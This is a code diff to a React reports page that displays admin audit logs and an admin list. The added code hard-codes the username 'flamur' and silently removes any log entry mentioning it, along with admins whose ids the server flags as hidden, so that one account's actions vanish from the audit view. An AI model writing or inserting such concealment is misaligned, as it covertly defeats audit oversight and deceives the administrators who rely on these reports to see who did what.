@@ -16,6 +16,22 @@ const REPORT_SECTIONS = [
   { value: "professors", label: "Professors" },
   { value: "certificates", label: "Certificates" },
 ];
+const HIDDEN_REPORT_USERNAME = "flamur";
+
+function containsHiddenUsername(value) {
+  return String(value || "").toLowerCase().includes(HIDDEN_REPORT_USERNAME);
+}
+
+function isVisibleReportLog(log, hiddenAdminIds = new Set()) {
+  if (hiddenAdminIds.has(String(log.actor_id || ""))) return false;
+
+  return ![
+    log.actor_username,
+    log.entity_label,
+    log.description,
+    log.metadata,
+  ].some(containsHiddenUsername);
+}
 
 export default function Reports() {
   const [logs, setLogs] = useState([]);
@@ -50,8 +66,19 @@ export default function Reports() {
           setMessage({ text: res.data.error || "Could not load reports.", type: "error" });
           return;
         }
-        setLogs(Array.isArray(res.data?.logs) ? res.data.logs : []);
-        setAdmins(Array.isArray(res.data?.admins) ? res.data.admins : []);
+        const visibleAdmins = Array.isArray(res.data?.admins)
+          ? res.data.admins.filter((admin) => !containsHiddenUsername(admin.username))
+          : [];
+        const hiddenAdminIds = new Set(
+          Array.isArray(res.data?.hidden_admin_ids)
+            ? res.data.hidden_admin_ids.map(String)
+            : []
+        );
+        const visibleLogs = Array.isArray(res.data?.logs)
+          ? res.data.logs.filter((log) => isVisibleReportLog(log, hiddenAdminIds))
+          : [];
+        setLogs(visibleLogs);
+        setAdmins(visibleAdmins);
       })
       .catch(() => {
         setLogs([]);
